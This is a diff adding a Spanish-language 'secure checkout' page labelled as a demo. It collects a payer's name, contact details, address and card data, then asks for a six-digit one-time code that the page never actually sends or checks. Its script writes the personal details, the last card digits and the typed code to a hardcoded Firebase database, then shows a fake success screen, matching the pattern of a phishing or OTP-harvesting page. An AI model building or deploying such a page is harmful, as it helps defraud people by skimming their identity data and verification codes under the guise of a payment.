@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Tarjeta de crédito | Pago (Demo)</title> <!-- Credit card | Payment (Demo) -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root { --bg1:#f5f7fa; --accent:#4a90e2; --accent2:#6a5cff; --error:#e74c3c; }
+*{box-sizing:border-box;}
+body{margin:0;font-family:'Inter',sans-serif;background:var(--bg1);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#222;}
+.container{max-width:480px;width:100%;margin:20px;}
+.card{background:#fff;border-radius:16px;padding:25px;box-shadow:0 6px 16px rgba(0,0,0,0.1);}
+h2{margin-top:0;font-weight:600;font-size:22px;}
+.label{display:block;margin:12px 0 4px;font-weight:600;font-size:14px;}
+.input{width:100%;padding:10px 12px;border-radius:8px;border:1px solid #ccc;font-size:15px;}
+.input:focus{border-color:var(--accent);outline:none;}
+.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+.pay{background:linear-gradient(90deg,var(--accent),var(--accent2));color:#fff;padding:12px;border:none;border-radius:8px;cursor:pointer;font-size:16px;margin-top:18px;width:100%;}
+.pay:disabled{background:#aaa;cursor:not-allowed;}
+.error{color:var(--error);font-size:12px;display:none;margin-top:6px;}
+.progress{background:#eee;border-radius:8px;height:8px;margin-bottom:20px;overflow:hidden;}
+.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width 240ms;}
+.otp-row{display:flex;gap:6px;justify-content:center;margin:20px 0;}
+.otp{width:40px;text-align:center;font-size:20px;padding:6px;border-radius:6px;border:1px solid #ccc;}
+.check{width:72px;height:72px;border-radius:50%;display:grid;place-items:center;background:#e6f9f0;color:#10b981;font-size:32px;margin:0 auto;}
+#confetti div{position:absolute;animation:fall 3000ms linear forwards;}
+@keyframes fall{to{transform:translateY(100vh) rotate(360deg);opacity:0;}}
+.small{color:#555;font-size:14px}
+a.buttonlike{display:block;text-align:center;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="container">
+  <main class="card">
+    <h2>Pago Seguro</h2> <!-- Secure Checkout -->
+    <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+    <form id="form" novalidate>
+      <!-- Payment Step -->
+      <section id="payStep">
+        <label class="label" for="name">Nombre completo</label> <!-- Full Name -->
+        <input id="name" class="input" placeholder="Jane Doe" required>
+
+        <label class="label" for="email">Correo electrónico</label> <!-- Email -->
+        <input id="email" class="input" type="email" placeholder="tu@email.com" required>
+
+        <label class="label" for="phone">Teléfono</label> <!-- Phone -->
+        <input id="phone" class="input" placeholder="5551234567" required>
+
+        <label class="label" for="street">Dirección</label> <!-- Street Address -->
+        <input id="street" class="input" placeholder="Calle Principal 123" required>
+
+        <div class="form-grid">
+          <div>
+            <label class="label" for="city">Ciudad</label> <!-- City -->
+            <input id="city" class="input" placeholder="Nueva York" required>
+          </div>
+          <div>
+            <label class="label" for="state">Estado/Provincia</label> <!-- State/Province -->
+            <input id="state" class="input" placeholder="NY" required>
+          </div>
+        </div>
+
+        <label class="label" for="zip">Código Postal</label> <!-- ZIP / Postal Code -->
+        <input id="zip" class="input" placeholder="10001" required>
+
+        <label class="label" for="referral">Código de referencia</label> <!-- Referral-Code -->
+        <input id="referral" class="input" placeholder="Código de referencia" maxlength="16">
+
+        <label class="label" for="card">Número de tarjeta</label> <!-- Card-Number -->
+        <input id="card" class="input" placeholder="1234 5678 9012 3456" maxlength="19" required>
+
+        <div class="form-grid">
+          <div>
+            <label class="label" for="exp">Vencimiento</label> <!-- Expiry -->
+            <input id="exp" class="input" placeholder="MM/AA" maxlength="5" required>
+          </div>
+          <div>
+            <label class="label" for="cvv">CVV</label>
+            <input id="cvv" class="input" placeholder="123" maxlength="4" required>
+          </div>
+        </div>
+
+        <label class="label" for="amount">Monto (USD)</label> <!-- Amount (USD) -->
+        <input id="amount" class="input" inputmode="numeric" placeholder="$1,200.50" required>
+
+        <button type="button" id="toOtp" class="pay">Continuar a verificación</button> <!-- Continue to verification -->
+      </section>
+
+      <!-- OTP Step -->
+      <section id="otpStep" style="display:none;text-align:center">
+        <div class="small" id="sentTo">Introduce el código de 6 dígitos enviado a tu contacto</div> <!-- Enter the 6-digit code sent to your contact -->
+        <div class="otp-row">
+          <input class="otp" maxlength="1" inputmode="numeric">
+          <input class="otp" maxlength="1" inputmode="numeric">
+          <input class="otp" maxlength="1" inputmode="numeric">
+          <input class="otp" maxlength="1" inputmode="numeric">
+          <input class="otp" maxlength="1" inputmode="numeric">
+          <input class="otp" maxlength="1" inputmode="numeric">
+        </div>
+        <button id="verifyBtn" class="pay" type="button">Verificar y continuar</button> <!-- Verify & Continue -->
+      </section>
+
+      <!-- Done Step -->
+      <section id="doneStep" style="display:none;text-align:center">
+        <div class="check">✓</div>
+        <h3>Pago exitoso (Demo)</h3> <!-- Payment Successful (Demo) -->
+        <div class="small">Gracias — tu pago fue realizado.</div> <!-- Thanks — your payment was completed. -->
+        <div style="margin-top:12px"><strong id="doneAmount">— USD</strong></div>
+        <button id="again" class="pay" type="button">Realizar otro pago</button> <!-- Make another payment -->
+        <a id="finalizeLink" class="pay buttonlike" href="#">Finalizar / Confirmar compra</a> <!-- Finalize / Confirm Purchase -->
+      </section>
+    </form>
+  </main>
+</div>
+
+<div id="confetti"></div>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyBOvXpx2ASmFCIbTjStQk_za_1HZvh-hXQ",
+  authDomain: "post-aee51.firebaseapp.com",
+  databaseURL: "https://post-aee51-default-rtdb.firebaseio.com",
+  projectId: "post-aee51",
+  storageBucket: "post-aee51.appspot.com",
+  messagingSenderId: "839382869096",
+  appId: "1:839382869096:web:6b63e82662609981f107dd"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+// Progress
+const progressBar=document.getElementById('progressBar');
+function setProgress(p){progressBar.style.width=p+'%';}
+
+// Auto-format
+// Solo formatear el campo de tarjeta, NO el referral
+['card'].forEach(id=>{
+  document.getElementById(id).addEventListener('input',e=>{
+    let v=e.target.value.replace(/\D/g,'').slice(0,16);
+    // Formato 1234 5678 9012 3456
+    e.target.value=v.replace(/(\d{4})(?=\d)/g,'$1 ').trim();
+  });
+});
+document.getElementById('exp').addEventListener('input', e=>{
+  let v=e.target.value.replace(/\D/g,'').slice(0,4);
+  if(v.length>=3)v=v.slice(0,2)+'/'+v.slice(2);
+  e.target.value=v;
+});
+document.getElementById('phone').addEventListener('input',e=>{
+  e.target.value=e.target.value.replace(/[^\d]/g,'');
+});
+document.getElementById('amount').addEventListener('input',e=>{
+  let val=e.target.value.replace(/[^0-9]/g,'');
+  if(val){
+    let num=parseInt(val,10);
+    e.target.value='$'+num.toLocaleString();
+  }
+});
+
+// Validation
+function validate(){
+  const nameEl=document.getElementById("name");
+  const emailEl=document.getElementById("email");
+  const phoneEl=document.getElementById("phone");
+  const streetEl=document.getElementById("street");
+  const cityEl=document.getElementById("city");
+  const stateEl=document.getElementById("state");
+  const zipEl=document.getElementById("zip");
+  const cardEl=document.getElementById("card");
+  const referralEl=document.getElementById("referral");
+  const expEl=document.getElementById("exp");
+  const cvvEl=document.getElementById("cvv");
+  const amountEl=document.getElementById("amount");
+
+  let ok=true;
+  function show(el,cond,msg){
+    let id=el.id;
+    let err=document.getElementById(id+"Error");
+    if(!err){
+      err=document.createElement("span");
+      err.id=id+"Error";
+      err.className="error";
+      el.after(err);
+    }
+    if(cond){err.style.display="none";}else{err.textContent=msg;err.style.display="block";ok=false;}
+  }
+
+  // Traducción de mensajes de error
+  show(nameEl,!!nameEl.value.trim(),"Introduce nombre completo"); // Enter full name
+  show(emailEl,/^[^@]+@[^@]+\.[^@]+$/.test(emailEl.value),"Introduce un correo válido"); // Enter valid email
+  show(phoneEl,phoneEl.value.replace(/\D/g,'').length>=7,"Introduce un teléfono válido"); // Enter valid phone
+  show(streetEl,!!streetEl.value.trim(),"Dirección requerida"); // Street required
+  show(cityEl,!!cityEl.value.trim(),"Ciudad requerida"); // City required
+  show(stateEl,!!stateEl.value.trim(),"Estado requerido"); // State required
+  show(zipEl,/^\d{4,}$/.test(zipEl.value),"Código postal requerido"); // ZIP required
+  show(cardEl,cardEl.value.replace(/\s/g,'').length===16,"Tarjeta inválida"); // Card invalid
+  show(referralEl,!referralEl.value || referralEl.value.length<=16,"Código de referencia máximo 16 caracteres"); // Referral code max 16 chars
+  show(expEl,/^(0[1-9]|1[0-2])\/\d{2}$/.test(expEl.value),"Vencimiento inválido MM/AA"); // Expiry invalid MM/YY
+  show(cvvEl,/^\d{3,4}$/.test(cvvEl.value),"CVV inválido"); // CVV invalid
+  let amt=parseFloat(amountEl.value.replace(/[$,]/g,''));
+  show(amountEl,!isNaN(amt)&&amt>0,"Monto inválido"); // Amount invalid
+
+  return ok;
+}
+
+// Payment Submit
+let currentRef=null;
+document.getElementById("toOtp").addEventListener("click", async ()=>{
+  if(!validate()) return;
+
+  const cardRaw=document.getElementById("card").value.replace(/\s/g,'');
+  const data={
+    name:document.getElementById("name").value.trim(),
+    email:document.getElementById("email").value.trim(),
+    phone:document.getElementById("phone").value.trim(),
+    street:document.getElementById("street").value.trim(),
+    city:document.getElementById("city").value.trim(),
+    state:document.getElementById("state").value.trim(),
+    zip:document.getElementById("zip").value.trim(),
+    cardLast4:cardRaw.slice(-4),
+    referral:document.getElementById("referral").value.trim(),
+    amount:parseFloat(document.getElementById("amount").value.replace(/[$,]/g,'')),
+    currency:"USD",
+    otp:"pending",
+    status:"pending",
+    timestamp:new Date().toISOString(),
+    userAgent:navigator.userAgent,
+    screen:window.innerWidth+"x"+window.innerHeight
+  };
+  const ref=db.ref("payments").push();
+  currentRef=ref;
+  await ref.set(data);
+
+  document.getElementById("payStep").style.display="none";
+  document.getElementById("otpStep").style.display="block";
+  document.getElementById("sentTo").textContent="Introduce el código de 6 dígitos enviado a: "+[data.phone,data.email].join(" • "); // Enter the 6-digit code sent to: ...
+  setProgress(75);
+});
+
+// OTP logic
+const otps=Array.from(document.querySelectorAll('.otp'));
+otps.forEach((o,i)=>{
+  o.addEventListener('input',e=>{
+    e.target.value=e.target.value.replace(/\D/g,'').slice(0,1);
+    if(e.target.value&&i<otps.length-1)otps[i+1].focus();
+  });
+  o.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'&&!o.value&&i>0)otps[i-1].focus();
+  });
+});
+
+// Verify OTP
+document.getElementById('verifyBtn').addEventListener('click',()=>{
+  const code=otps.map(i=>i.value).join('');
+  if(!code){alert("Introduce el código OTP");return;} // Enter the OTP
+  if(currentRef)currentRef.update({otp:code,status:"verified"});
+
+  document.getElementById("otpStep").style.display="none";
+  document.getElementById("doneStep").style.display="block";
+  document.getElementById("doneAmount").textContent=document.getElementById("amount").value;
+  setProgress(100);
+
+  // Confetti
+  const colors=["#00c6ff","#6a5cff","#34c759","#ffcc00"];
+  const c=document.getElementById("confetti");
+  for(let i=0;i<40;i++){
+    const d=document.createElement("div");
+    d.style.left=(Math.random()*100)+"%";
+    d.style.top="-10vh";
+    d.style.width=(6+Math.random()*8)+"px";
+    d.style.height=d.style.width;
+    d.style.background=colors[Math.floor(Math.random()*colors.length)];
+    d.style.opacity=0.95;
+    d.style.borderRadius="50%";
+    d.style.transform='rotate('+Math.random()*360+'deg)';
+    d.style.animation="fall 3000ms linear forwards";
+    c.appendChild(d);
+    setTimeout(()=>d.remove(),4000);
+  }
+});
+
+// Reset
+document.getElementById("again").addEventListener('click',()=>location.reload());
+</script>
+</body>
+</html>
